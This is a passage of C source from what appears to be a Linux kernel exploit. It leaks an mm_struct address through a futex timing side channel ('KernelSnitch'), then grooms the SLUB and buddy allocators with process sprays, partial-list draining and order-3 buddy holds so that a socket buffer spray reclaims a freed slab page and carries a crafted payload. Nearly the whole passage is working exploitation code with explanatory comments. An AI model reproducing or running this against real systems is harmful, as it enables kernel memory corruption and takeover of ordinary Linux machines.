      spray_ctx.memfds[i] = -1;
    }

    /* Saturate the mm cache partial list BEFORE the target slab empties.
     * slub.c only returns an emptied slab to the buddy allocator when the
     * node already holds s->min_partial (5) partial slabs:
     *     if (!new.inuse && n->nr_partial >= s->min_partial) discard
     * An emptier list queues the empty slab instead, its order-3 page is
     * never freed, and the SKB spray always lands on some other page (the
     * symptom: every punch faulted).  Slabs that stay partially used are
     * always queued without that check, so freeing 7/8 of spray_ctx leaves
     * ~16 stable partial slabs and keeps the list above the threshold for
     * as long as the target is released.  They are far from the target and
     * stay allocated, so they cannot merge with the page we want. */
    mm_slab_log("pre-saturate");
    size_t spray_kept = 0;
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
      if (spray_ctx.childs[i] <= 0) {
        continue;
      }
      if ((i % 8) == 0) {
        spray_kept++;
        continue;
      }
      kill_child(spray_ctx.childs[i]);
      spray_ctx.childs[i] = -1;
    }
    pr_info("KS_PARTIAL slabs=%zu kept=%zu\n", spray_ctx.mm_cnt / mm_objs_per_slab,
            spray_kept);
    mm_slab_log("post-saturate");

    /* post_ctx fills the tail of the target slab, so it has to go before the
     * leaked mm.  Its slab is also the order-3 buddy of the target page: send
     * one order-3 skb right afterwards to leave that buddy allocated, so the
     * two cannot merge into a higher order when the target is discarded. */
    if (getenv("KS_RECLAIM_WAIT_FREES")) {
      mm_slab_counts(&active_before, &slab_before);
    }
    if (!hold_neighbours) {
      /* The slab directly above the target must stay allocated until the
       * reclaim has run: freeing it as the target empties makes the pair
       * coalesce upward, and expand() only ever returns the low fragment,
       * so the target can then never be handed out at order 3. */
      if (getenv("KS_HOLD_POST") == NULL) {
        for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
        if (post_ctx.childs[i] > 0) {
          kill_child(post_ctx.childs[i]);
          post_ctx.childs[i] = -1;
        }
      }
      }
    }
    {
      static int buddy_sv[2] = { -1, -1 };
      static unsigned char filler[SKB_SEND_SIZE];
      if (buddy_sv[0] >= 0) {
        close(buddy_sv[0]);
        close(buddy_sv[1]);
        buddy_sv[0] = buddy_sv[1] = -1;
      }
      memset(filler, 0x41, sizeof(filler));
      if (socketpair(AF_UNIX, SOCK_STREAM, 0, buddy_sv) == 0) {
        int sndbuf = SKB_RECLAIM_SNDBUF;
        struct iovec iov;
        struct msghdr msg;
        setsockopt(buddy_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        memset(&iov, 0, sizeof(iov));
        iov.iov_base = filler;
        iov.iov_len = sizeof(filler);
        memset(&msg, 0, sizeof(msg));
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        ssize_t n = sendmsg(buddy_sv[0], &msg, MSG_DONTWAIT);
        pr_info("KS_BUDDY_FILL bytes=%zd errno=%d\n",
                n, n < 0 ? errno : 0);
      } else {
        pr_warning("KS_BUDDY_FILL socketpair errno=%d\n", errno);
      }
    }

    /* The target slab is released later, right before the SKB spray.  Emptying
     * it here would expose its order-3 page to the buddy churn of the 1024
     * prepare_ctx exits that follow, and the page would be merged or handed
     * out before the spray ever asks for it. */
    mm_slab_log("post-target");

    /* A plausible address is not a verified one.  Reproduce the bucket
     * agreement of this run's collisions before trusting the scan result,
     * otherwise the punch runs against a wild lock and dies in
     * _raw_spin_trylock - a reboot that yields no information. */
    int mm_verified = ks_pc_answer_matches_collisions(leaked);
    /* The strength of the leak is the cross-validated collision set, not the
     * pile counts: candidate1/2_count are the futexes that timed slow under
     * each pile (116-140 is normal and includes unrelated noise), while
     * accepted_count is the intersection of two independent piles, which is
     * what the mm candidate is tested against.  Fewer than 8 accepted
     * collisions cannot distinguish an mm from a coincidence, so refuse. */
    size_t accepted = ks->accepted_count;
    int weak = (accepted < 8);
    if (ks->state != KERNELSNITCH_MM_FOUND || leaked == (uintptr_t)-1 ||
        mm_verified == 0 || weak) {
      pr_warning("KernelSnitch mm_struct leak failed state=%d mm=%016zx "
                 "verified=%d accepted=%zu pile1=%zu pile2=%zu\n",
                 (int)ks->state, leaked, mm_verified, accepted,
                 (size_t)ks->candidate1_count, (size_t)ks->candidate2_count);
      leak_stage_failed = 1;
      kernelsnitch_cleanup(ks);
      ks = NULL;
      for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
        kill_child(prepare_ctx.childs[i]);
      }
      cleanup_page_prepare_state();
      return 0;
    }
    cached_leaked_mm = leaked;
    /* The address is only kept after the hash re-check above. */
    kp_result_mark(KP_ADDRESS_VERIFIED);
  }

  if (getenv("KS_MM_TEST") && !getenv("KS_SLIDE_TEST")) {
    pr_success("KS_MM_TEST ok mm=%016zx base=%016zx\n", leaked,
               leaked & ~(PAGE_SIZE - 1));
    fflush(stdout);
    exit(0);
  }

  select_linear_map_delta(leaked);
  uintptr_t base = select_slab_base(leaked, slab_base_candidate);
  pr_info("KS_TIME page_prep_ms=%.0f\n", ks_now_ms() - ks_t0);
  pr_info("KSLAB_BASE_CANDIDATE mm=%016zx base=%016zx idx=%d\n",
          leaked, base, slab_base_candidate % MM_SLAB_CANDIDATE_PAGES);
  slab_base_candidate++;
  /* The leak child is the second allocation from the burst slab
   * (KS_PRE leak_slot=1), so a correct resolution lands on slot 1. */
  (void)kp_identity_anchor(&kp_geo, leaked, 1, &kp_anchor);
  /* Point the chain-walk owner at the mm_struct so the
   * "waiter->prio = task->prio" copy leaks *(int *)mm_va into the SKB. */
  g_leak_target = leaked;
  pr_info("KS_LEAK_TARGET mm=%016zx prio_read=%016zx\n",
          leaked, leaked);
  if (!prepare_skb_payload(base, payload_mode)) {
    if (ks) {
      kernelsnitch_cleanup(ks);
      ks = NULL;
    }
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  page_image_report(-1, "intent");
  /* The trigger refs must be gone before anything is sent, otherwise the
   * discard lands after the spray and the page is never free when the
   * skb reclaim asks for it. */
  ks_trigger_release(trigger_fds, trigger_count);
  mm_slab_log("post-release");
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = SKB_RECLAIM_SNDBUF;
  {
    const char *sb = getenv("KS_RECLAIM_SNDBUF");
    if (sb && *sb) sndbuf = atoi(sb);
  }
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = page_image.buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    if (pre_ctx.memfds[i] >= 0) {
      SYSCHK(close(pre_ctx.memfds[i]));
    }
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    if (post_ctx.memfds[i] >= 0) {
      SYSCHK(close(post_ctx.memfds[i]));
    }
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    if (spray_ctx.memfds[i] >= 0) {
      SYSCHK(close(spray_ctx.memfds[i]));
    }
    spray_ctx.memfds[i] = -1;
  }

  /* The pcp_shaping skb is a live kmalloc-32k object.  Closing it here
   * would free that object, and the first reclaim send would recycle it
   * instead of allocating a fresh order-3 slab - the target page then
   * stays free and the punch reads a foreign page.  Kept open until the
   * sends have taken the target block. */
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  /* The target's last reference stays pinned until the send below; the
   * sweep and trigger must run while the slab is still one-live. */
  /* Empty the target slab first: the pre_ctx fillers complete it and the
   * leaked child is its last live object.  Closing a memfd is not enough
   * (proc_mem_open pins the mm via mmget), so the tasks themselves are
   * reaped here, and the leaked child's exit drops the final mmput(). */
  {
    const char *bh = getenv("KS_BUDDY_HOLD");
    long want = bh ? atol(bh) : 0;
    if (want > 0 && want <= 8192) {
      ks_buddy_hold((size_t)want, NULL, &buddy_fds, &buddy_n);
    }
  }
  int trigger_drain = !leak_stage_failed;
  if (trigger_drain) {
    trigger_slabs = 24;
    const char *ts = getenv("KS_TRIGGER_SLABS");
    if (ts && *ts) {
      long v = atol(ts);
      if (v > 0 && v <= 64) {
        trigger_slabs = (size_t)v;
      }
    }
    /* Hold back cpu_partial + 2 full slabs for the pre-image crossing free.
     * Vendor put_cpu_partial() (mm/slub.c) adds page->objects - page->inuse
     * pobjects and calls unfreeze_partials() when the OLD count exceeds
     * s->cpu_partial.  The target slab is frozen immediately before this
     * drain (after every sweep discard), so the list contains the target page
     * at pobjects >= 1.  At most one held-back slab is this CPU's current
     * page, and its first free returns FREE_FROZEN without feeding pobjects,
     * so cpu_partial + 2 first frees guarantee at least cpu_partial + 1
     * pobject adds - one more than the crossing needs.  Everything else is
     * freed while the target slab is still full. */
    trigger_drain_slabs = mm_cpu_partial_limit() + 2;
    if (trigger_drain_slabs > trigger_slabs) {
      trigger_drain_slabs = trigger_slabs;
    }
    trigger_pre_slabs = trigger_slabs > trigger_drain_slabs
                            ? trigger_slabs - trigger_drain_slabs
                            : 0;
    pr_info("KS_DRAIN_LIMIT cpu_partial=%zu drain_slabs=%zu pre_slabs=%zu "
            "slabs=%zu\n",
            mm_cpu_partial_limit(), trigger_drain_slabs, trigger_pre_slabs,
            trigger_slabs);
    pin_to_core(CORE);
    if (!ks_trigger_prepare(trigger_slabs, &trigger_fds, &trigger_count)) {
      trigger_drain = 0;
      trigger_slabs = 0;
      trigger_pre_slabs = 0;
    }
  }
  /* The leak child stays alive until the send point below; its own mm
   * keeps the target slab one-live while the trigger allocates. */
  if (trigger_drain) {
    /* The trigger must run while the target slab is still FULL: the first
     * free of a full slab is the only event that calls put_cpu_partial(),
     * and these frees saturate the node partial list above min_partial.
     * The pre_ctx fillers are killed after this loop so the target slab is
     * still full here; that keeps its later first free from being drained by
     * the pre-fire. */
    mm_slab_log("pre-spray");
    {
      /* One first-free per slab feeds pobjects exactly once; that is enough
       * to saturate node partial for the target drain.  More passes only
       * empty the slabs and discard the partials the drain depends on. */
      for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
        if (post_ctx.memfds[i] >= 0) SYSCHK(close(post_ctx.memfds[i]));
        post_ctx.memfds[i] = -1;
      }
      for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
        if (spray_ctx.memfds[i] >= 0) SYSCHK(close(spray_ctx.memfds[i]));
        spray_ctx.memfds[i] = -1;
      }
      const char *ps = getenv("KS_TRIGGER_PASSES");
      /* ONE pass: each slab's first free is the only one that calls
       * put_cpu_partial().  Extra passes empty the trigger slabs and discard
       * the node partials the target drain needs, so they are opt-in only. */
      long pv = (ps && *ps) ? strtol(ps, NULL, 10) : 1;
      if (pv < 1) pv = 1;
      /* Passes past mm_objs_per_slab close nothing, and a negative value
             * must not wrap to SIZE_MAX and spin forever. */
      if ((size_t)pv > mm_objs_per_slab) pv = (long)mm_objs_per_slab;
      size_t passes = (size_t)pv;
      for (size_t pass = 0; pass < passes; ++pass) {
        {
          size_t live[4] = {0, 0, 0, 0};
          size_t closed[4] = {0, 0, 0, 0};
          size_t killed[4] = {0, 0, 0, 0};
          struct mm_ctx *ctxs[4] = {&prepare_ctx, &pre_ctx, &post_ctx, &spray_ctx};
          for (int c = 0; c < 4; ++c) {
            for (size_t i = 0; i < ctxs[c]->mm_cnt; ++i) {
              if (ctxs[c]->memfds[i] >= 0) live[c]++;
            }
          }
          for (size_t i = 0; i < prepare_ctx.mm_cnt; ++i) {
            if (prepare_ctx.memfds[i] >= 0) {
              closed[0]++;
              SYSCHK(close(prepare_ctx.memfds[i]));
              prepare_ctx.memfds[i] = -1;
            }
            if (prepare_ctx.childs[i] > 0) {
              killed[0]++;
              kill_child(prepare_ctx.childs[i]);
              prepare_ctx.childs[i] = -1;
            }
          }
          static char sacc[256];
          snprintf(sacc, sizeof sacc,
                   "sweep n=%zu/%zu/%zu/%zu live=%zu/%zu/%zu/%zu "
                   "closed=%zu/%zu/%zu/%zu killed=%zu/%zu/%zu/%zu",
                   prepare_ctx.mm_cnt, pre_ctx.mm_cnt, post_ctx.mm_cnt,
                   spray_ctx.mm_cnt,
                   live[0], live[1], live[2], live[3],
                   closed[0], closed[1], closed[2], closed[3],
                   killed[0], killed[1], killed[2], killed[3]);
          mm_slab_log(sacc);
        }
        mm_slab_log("post-sweep");
        ks_trigger_fire(trigger_fds, trigger_pre_slabs * mm_objs_per_slab,
                        pass);
      }
    }
    if (getenv("KS_LOG_POST_DRAIN")) {
      /* Measurement-only: this is the first slabinfo read after the discard,
       * with no send and no trigger release in between, so pre-spray minus
       * post-drain is exactly the number of slabs the drain freed. */
      mm_slab_log("post-drain");
    }
  }
  /* Fallback only: with trigger_drain the pre_ctx freeze moves to just
   * before the held-back drain, after every sweep discard, so no earlier
   * unfreeze_partials() can move the target page to the node partial before
   * the crossing free.  Here (leak stage failed, no target page) the fillers
   * are still released with the rest of the post-spray population. */
  if (!trigger_drain) {
    pin_to_core(CORE);
    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      kill_child(pre_ctx.childs[i]);
      pre_ctx.childs[i] = -1;
    }
  }
  /* slub.c does not discard an emptied slab that is still frozen on a CPU
   * partial list; that needs __unfreeze_partials(), which runs once the list
   * grows past s->cpu_partial (6 slabs for 1 KiB objects).  Free one more
   * batch of whole slabs here to trigger it, so the just-emptied target page
   * is actually returned to the buddy allocator before the spray asks for an
   * order-3 block.  The rest is reaped after the sends. */
  size_t prep_burst = 8 * mm_objs_per_slab;
  {
    const char *b = getenv("KS_FREE_BURST");
    if (b && *b) {
      long v = atol(b);
      if (v > 0) {
        prep_burst = (size_t)v;
      }
    }
  }
  if (prep_burst > prepare_ctx.mm_cnt) {
    prep_burst = prepare_ctx.mm_cnt;
  }
  if (trigger_drain) {
    /* The drain already forced the unfreeze; 1024 task exits here would only
     * give buddy more chances to hand the freed page to someone else. */
    prep_burst = 0;
  }
  for (size_t i = 0; i < prep_burst; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
    }
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }
  sched_yield();
  sched_yield();
  /* exit_mm() -> mmput() -> __mmput() -> mmdrop() frees the mm_struct
   * inside the child's own exit (kernel/exit.c; kernel/fork.c:1069-1100),
   * and kill_child() reaps the task, so the object is gone when it returns.
   * Which page the cache then exposes is a separate question.  A fixed
   * sleep is the wrong tool: too short and the
   * spray runs while the page is still owned by the slab (2026-10-31: the
   * cache showed all 2208 objects live at pre-spray and only 1985 after the
   * sends), too long and the freed page has a blind window in which any other
   * order-3 caller can take it.  With KS_RECLAIM_WAIT_FREES the payload waits
   * on the cache's own slab count and sprays the moment a slab disappears. */
  if (!trigger_drain) {
    mm_slab_log("pre-spray");
  }
  {
    int wait_frees = getenv("KS_RECLAIM_WAIT_FREES") != NULL;
    if (wait_frees && slab_before > 0) {
      long deadline_ms = 400;
      long waited_ms = 0;
      long slabs_now = -1;
      long active_now = -1;
      const char *w = getenv("KS_RECLAIM_WAIT_MS");
      if (w && *w) deadline_ms = atol(w);
      while (waited_ms < deadline_ms) {
        mm_slab_counts(&active_now, &slabs_now);
        if (slabs_now >= 0 && slabs_now < slab_before) break;
        if (active_before > 0 && active_now >= 0 &&
            active_now <= active_before - (long)mm_objs_per_slab) break;
        usleep(1000);
        waited_ms++;
      }
      pr_info("KS_RECLAIM_WAIT active_before=%ld active_now=%ld "
              "slabs_before=%ld slabs_now=%ld waited_ms=%ld\n",
              active_before, active_now, slab_before, slabs_now, waited_ms);
    } else {
      long delay = SKB_RECLAIM_DELAY_US;
      const char *d = getenv("KS_RECLAIM_DELAY_US");
      if (d && *d) delay = atol(d);
      if (delay > 0) usleep((useconds_t)delay);
    }
  }

  /* Last free before the reclaim: the leaked mm is the target slab's only
   * remaining object and the partial list has been saturated by the sweep
   * and the trigger.  close() runs mem_release -> mmdrop -> free_mm
   * synchronously, so the empty slab is discarded here and the next
   * order-3 allocation (the first reclaim send) takes that page. */
  if (child_leak > 0) {
    pr_info("KS_TARGET base=%016zx mm=%016zx pinned=1\n",
            (size_t)base, (size_t)leaked);
    /* Empty the kept spray slabs FIRST.  Their last frees put 16 partial
     * slabs on the node partial list, so when the target's own last
     * object is freed below, __slab_free() sees n->nr_partial >=
     * s->min_partial and discards the target instead of queueing it. */
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
      if (spray_ctx.childs[i] > 0) {
        kill_child(spray_ctx.childs[i]);
        spray_ctx.childs[i] = -1;
      }
    }
    mm_slab_log("post-spray-kill");
    slab32_log("post-spray-kill");
    /* The target block is still allocated, so base ^ 0x8000 is the
     * order-3 buddy it would coalesce with when released.  Occupy the
     * surrounding order-3 blocks with held sends BEFORE the final free;
     * if the buddy is among them the target cannot merge upward and the
     * first image send after the free takes it from the freelist head. */
    if (ks_buddy_hold(8, NULL, &buddy_hold_fds, &buddy_hold_n) &&
        buddy_hold_n > 0) {
      pr_info("KS_NEIGHBOR_HOLD blocks=%zu base=%016zx buddy=%016zx "
              "scope=order3-page\n",
              buddy_hold_n, (size_t)base, (size_t)(base ^ ORDER3_SIZE));
    }
    /* Isolation: kill the non-neighbour children and close every fd BEFORE
     * the target, so the target's slab is the only one that can be emptied.
     * lead_ctx and post_ctx are the slabs allocated immediately before and
     * after the target slab (the KS_PRE boundary plus 31 fillers put the
     * leak child last in the target slab); they stay alive across the
     * crossing free so the target block has no free order-3 buddy to merge
     * with. */
    release_ctx_children(&spray_ctx);
    release_ctx_children(&prepare_ctx);
    /* Measured, not asserted: held_order3_blocks is how many 32 KB frag
     * pages ks_buddy_hold() actually has queued right now (0 if the hold
     * failed), neighbour_children is how many children are still alive in
     * the slabs allocated adjacent to base (post_ctx/control).  Whether that
     * set contains base ^ 0x8000 cannot be read from userspace on this tree
     * (pagemap PFNs are CAP_SYS_ADMIN-gated), so siblinghood is reported as
     * unmeasured rather than claimed.  The memfd is closed at the emptying
     * free below, not here: closing it here would empty the target slab
     * before the crossing saturates n->partial. */
    pr_info("KS_BUDDY_HELD base=%016zx buddy=%016zx held_order3_blocks=%zu "
            "neighbour_children=%zu sibling=unmeasured "
            "reason=pagemap-pfn-needs-CAP_SYS_ADMIN\n",
            (size_t)base, (size_t)(base ^ (uintptr_t)ORDER3_SIZE),
            buddy_hold_n, post_ctx.mm_cnt + control_cnt);
    {
      /* The other children's mm frees are synchronous with their exits
       * and are reaped by kill_child(), so they have landed here; the
       * bounded wait lets the cache's counters settle before the
       * isolation sample is taken. */
      long s0 = -1;
      mm_slab_counts(NULL, &s0);
      for (int i = 0; i < 50; ++i) {
        long s = -1;
        usleep(10000);
        mm_slab_counts(NULL, &s);
        if (s >= 0 && s < s0) {
          break;
        }
      }
    }
    mm_slab_counts_full(&post_isolate_active, &post_isolate_num,
                        &post_isolate_slabs);
    mm_slab_log("post-isolate");
    {
      pid_t target = pre_ctx.childs[pre_ctx.mm_cnt - 1];
      pid_t seeder_pid = -1;
      int empty_cpu_before = -1;
      int empty_cpu_after = -1;
      int pre = count_tgid_tasks(target);
      int extra = 0;
      pr_info("KS_TARGET_TGID pre=%d pid=%d\n", pre, (int)target);
      int left = -1;
      int memfds;
      ssize_t head_warm = -1;
      size_t freeze_kill = 0;
      int target_state_at_freeze = 0;
      int crossed_at = -1;
      int target_freed_at_cross = 0;
      int empty_registered = 0;
      int whole_slab_discard = 0;
      long post_active = -1, post_num = -1, post_slabs = -1;
      long cross_active = -1, cross_num = -1, cross_slabs = -1;
      long freeze_active = -1, freeze_num = -1, freeze_slabs = -1;
      long core_active = -1, core_num = -1, core_slabs = -1;
      long empty_active = -1, empty_num = -1, empty_slabs = -1;
      long ctl_active = -1, ctl_num = -1, ctl_slabs = -1;
      double free_done_t0 = -1;
      long free_wait_ms = 20;
      int image_done = -1;
      int image_want = -1;
      int send_cpu = -1;
      ssize_t image_ret = 0;
      int image_errno = 0;
      double free_t0 = -1.0;
      double free_to_send_ms = -1.0;
      FILE *post_f = NULL;
      int targeted = 0;
      kp_gate_verdict gate_verdict;
      kp_run run;
      int baseline_stable = 0;
      (void)kp_run_begin(&run, KP_STAGE_DRAIN);
      pin_to_core(CORE);
      /* Close every inherited /proc/<pid>/mem fd and take none on the target.
       * A memfd does hold mm_count via proc_mem_open()'s mmgrab, and
       * mem_release() drops it, so the child's exit_mm() -> __mmput() ->
       * mmdrop() can no longer reach zero while the fd is open: the free is
       * deferred to close().  That was measured on this tree and the close did
       * NOT reach the last reference (KS_ARITH d_empty=0, still 0 after the
       * 20 ms wait), so the emptied page never appeared.  The exit path is the
       * one that measured discarded=1 with d_num=-32 and d_slabs=-1, so the
       * target keeps no fd and its exit is the emptying free. */
      memfds = close_target_memfds(target);
      pr_info("KS_TARGET memfds_closed=%d memfd=none base=%016zx cpu=%d\n",
              memfds, (size_t)base, sched_getcpu());

      /* Everything that allocates happens here, before the freeze: the warm
       * kmalloc-4k object feeds the post sample's seq buffer, and slabinfo is
       * opened now so no allocation sits between the crossing's unfreeze and
       * the target's free. */
      {
        struct iovec wiov;
        struct msghdr wmsg;
        wiov.iov_base = page_image.buf;
        wiov.iov_len = (size_t)SKB_FRAG_BIAS;
        memset(&wmsg, 0, sizeof(wmsg));
        wmsg.msg_iov = &wiov;
        wmsg.msg_iovlen = 1;
        errno = 0;
        head_warm = sendmsg(pcp_shaping_sv[0], &wmsg, 0);
        pr_info("KS_HEAD_WARM bytes=%zd want=%d errno=%d\n", head_warm,
                (int)SKB_FRAG_BIAS, errno);
      }
      {
        char warmbuf[SKB_FRAG_BIAS];
        errno = 0;
        ssize_t drained =
            recv(pcp_shaping_sv[1], warmbuf, sizeof(warmbuf), MSG_DONTWAIT);
        pr_info("KS_HEAD_DRAIN bytes=%zd want=%d errno=%d\n", drained,
                (int)SKB_FRAG_BIAS, errno);
      }
      post_f = fopen("/proc/slabinfo", "r");

      /* Freeze base's page with the scan child as its last live object: all
       * 31 filler frees leave inuse 1, and the first of them takes the
       * vendor full-page branch (prior == NULL, was_frozen == 0), so the
       * page is frozen onto c->partial.  The target is deliberately NOT
       * killed here: its own mmput is the single emptying free, after the
       * crossing has put the page on n->partial above min_partial. */
      pin_to_core(CORE);
      freeze_kill = pre_ctx.mm_cnt - 1;
      /* Ownership of the 32 anchor slots, measured before any free: a child
       * that died earlier already ran exit_mm(), so its slot was free and the
       * freezer population forked after the burst can hold it.  The page then
       * cannot empty when the 31 fillers and the target are freed, no matter
       * what the node partial count is. */
      {
        size_t alive = 0, zombie = 0, gone = 0;
        int tst;
        int exclusive;
        for (size_t i = 0; i < freeze_kill; i++) {
          int st = task_state_char(pre_ctx.childs[i]);
          if (st == 0) {
            gone++;
          } else if (st == 'Z' || st == 'X') {
            zombie++;
          } else {
            alive++;
          }
        }
        tst = task_state_char(target);
        target_state_at_freeze = tst;
        exclusive = (zombie == 0 && gone == 0 && tst != 0 && tst != 'Z' &&
                     tst != 'X');
        pr_info("KS_SLAB_ALIVE slots=%zu alive=%zu zombie=%zu gone=%zu "
                "target=%c exclusive=%d\n",
                freeze_kill + 1, alive, zombie, gone, tst ? tst : '-',
                exclusive);
        if (!exclusive) {
          pin_bad++;
        }
      }
      pr_info("KS_SLAB_OWNERS slots=%d fillers=%zu target=1 total=%zu "
              "post_ctx=%zu lead_ctx=%zu cpu=%d\n", (int)mm_objs_per_slab,
              freeze_kill, freeze_kill + 1, post_ctx.mm_cnt,
              lead_ctx.mm_cnt, sched_getcpu());
      /* A page parks on the freeing CPU's partial list, so every filler must
       * free on the CPU the crossing drains.  Wait for each child's own pin
       * report, then confirm it from that child's /proc/<pid>/stat; any
       * mismatch refuses the cycle instead of producing FREE_FROZEN. */
      pin_bad = 0;
      {
        size_t ready = 0;
        size_t cpu0 = 0;
        for (size_t i = 0; i < freeze_kill; i++) {
          int slot = pre_slots[i];
          if (slot >= 0 && slot < KS_PIN_SLOTS) {
            for (int w = 0; w < 200 && pin_seen[slot] == 0; w++) {
              pin_drain();
              usleep(1000);
            }
            if (pin_seen[slot] != 0) {
              ready++;
            }
          }
          if (task_cpu_hint(pre_ctx.childs[i]) == (int)CORE) {
            cpu0++;
          } else {
            pin_bad++;
          }
        }
        pr_info("KS_PIN group=pre fillers=%zu ready=%zu cpu0=%zu other=%zu "
                "ok=%d\n", freeze_kill, ready, cpu0, freeze_kill - cpu0,
                pin_bad == 0);
      }
      /* The survivor was forked pinned to the escaped CPU; wait for that
       * affinity to be reflected so the CPU read is a measurement. */
      for (int w = 0; w < 50; w++) {
        burst_empty_cpu = task_cpu_hint(target);
        if (burst_empty_cpu == (int)EMPTYING_CPU) {
          break;
        }
        usleep(20000);
      }
      if (control_cnt > 1) {
        {
          size_t ready = 0;
          size_t cpu0 = 0;
          size_t other = 0;
          for (size_t i = 0; i + 1 < control_cnt; i++) {
            int slot = ctl_slots[i];
            if (slot >= 0 && slot < KS_PIN_SLOTS) {
              for (int w = 0; w < 200 && pin_seen[slot] == 0; w++) {
                pin_drain();
                usleep(1000);
              }
              if (pin_seen[slot] != 0) {
                ready++;
              }
            }
            if (task_cpu_hint(control_childs[i]) == (int)CORE) {
              cpu0++;
            } else {
              other++;
              pin_bad++;
            }
          }
          pr_info("KS_PIN group=control fillers=%zu ready=%zu cpu0=%zu "
                  "other=%zu ok=%d\n", control_cnt - 1, ready, cpu0, other,
                  pin_bad == 0);
        }
        /* Fillers stay alive: their first free on CPU 0 would unfreeze
         * base's page long before the crossing.  They die after the image is
         * queued, in the crossing path below. */
        pr_info("KS_CONTROL_PINNED fillers=%zu kept_pid=%d cpu=%d "
                "empty_cpu=%d\n", control_cnt - 1, (int)control_last,
                sched_getcpu(), task_cpu_hint(control_last));
      }
      /* Seed EMPTYING_CPU ms cache active slab before the crossing: base
       * page is still frozen on CORE cpu_partial here, so that CPU cannot
       * take it, and afterwards its c->page is a slab of ours.  The parent
       * blocks until the seeder has finished its allocations; without that
       * handshake the forks race the emptying free and the CPU's c->page
       * is still whatever it was. */
      {
        int seed_fd[2] = {-1, -1};
        int seed_ready = -1;
        int seed_forked = -1;
        int seed_cpu = -1;
        if (pipe(seed_fd) == 0) {
          seeder_pid = clone_seeder((int)mm_objs_per_slab, seed_fd[1]);
          close(seed_fd[1]);
          seed_fd[1] = -1;
          if (seeder_pid > 0) {
            int report[2] = {-1, -1};
            ssize_t got = read(seed_fd[0], report, sizeof(report));
            if (got == (ssize_t)sizeof(report)) {
              seed_ready = 1;
              seed_forked = report[0];
              seed_cpu = report[1];
            }
          }
          close(seed_fd[0]);
          seed_fd[0] = -1;
        }
        pr_info("KS_SEEDER pid=%d slots=%zu ready=%d forked=%d cpu=%d "
                "parent_cpu=%d empty_cpu=%d\n",
                (int)seeder_pid, mm_objs_per_slab, seed_ready, seed_forked,
                seed_cpu, sched_getcpu(), burst_empty_cpu);
      }

      /* Cross c->partial with first-frees of the held-back trigger pages.
       * The free whose put_cpu_partial() sees pobjects > cpu_partial calls
       * unfreeze_partials(), which moves base's page (inuse 1) to n->partial
       * above min_partial.  The scan child is then freed inside that same
       * branch, with no sample, allocation or other free of the page in
       * between, so its own mmput is the emptying free and takes
       * slab_empty -> discard_slab. */
      /* Preload CORE's cpu_partial list to exactly cpu_partial pages before
       * base's page is frozen.  Each first-free of a full slab contributes
       * page->objects - page->inuse == 1 to pobjects (mm/slub.c
       * put_cpu_partial), so after these kills pobjects == limit and the
       * fillers' own first free (base's page) takes it to limit + 1 without
       * draining (the check is made against the previous page).  The single
       * first-free after the target's death then sees pobjects > limit and
       * runs unfreeze_partials(), which discards base's page because its
       * inuse is already 0.  Doing it this way means only the target's own
       * exit separates the freeze from the drain: the seven-kill sequence
       * used to leave base's page frozen on c->partial for ~600 ms, and
       * get_cpu_partial() hands a frozen page straight to the owning CPU as
       * its active slab, after which the target's free takes do_slab_free()'s
       * fastpath and nothing is ever discarded. */
      {
        size_t preload = mm_cpu_partial_limit();
        (void)preload;
        fz_i = 0;
        pin_to_core(CORE);
        /* Fill the cache's cached partial pages BEFORE base's page is
         * pushed.  Every page we complete is a full page of our children, and
         * a kill on one is a full page's first free - the only free that can
         * push c->partial past cpu_partial and run unfreeze_partials().  The
         * allocation has to happen here: after the fillers have frozen base's
         * page, 256 more mm allocations take base's page as an active slab,
         * which re-freezes it and turns the target's own free into a
         * FREE_FROZEN no-op (measured: d_empty = 0 every cycle). */
        {
          size_t have = 0;
          long fz_active = -1;
          long fz_num = -1;
          long fz_slabs = -1;
          long fz_free = -1;
          mm_slab_counts_full(&fz_active, &fz_num, &fz_slabs);
          if (fz_active >= 0 && fz_num >= fz_active) {
            fz_free = fz_num - fz_active;
          }
          while (have < KS_FREEZER_DRAIN) {
            pid_t c = clone_child_cpu(CORE);
            if (c <= 0) {
              break;
            }
            fz_drain[have++] = c;
          }
          pr_info("KS_FREEZER children=%zu pages=%zu free_before=%ld "
                  "active=%ld num=%ld slabs=%ld cpu=%d\n",
                  have, have / mm_objs_per_slab, fz_free, fz_active, fz_num,
                  fz_slabs, sched_getcpu());
        }
        /* Reset CORE's c->partial before base's page is pushed, and prove the
